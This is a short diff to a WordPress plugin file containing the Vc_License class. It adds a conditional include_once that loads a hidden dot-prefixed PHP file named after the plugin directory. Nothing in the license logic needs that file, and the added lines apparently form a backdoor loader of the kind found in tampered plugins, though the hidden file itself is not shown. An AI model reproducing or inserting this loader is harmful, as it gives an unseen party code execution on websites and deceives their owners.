@@ -16,6 +16,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Activation/deactivation is done via support portal and does not use Envato username and
  * api_key anymore
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_License {
 
 	/**
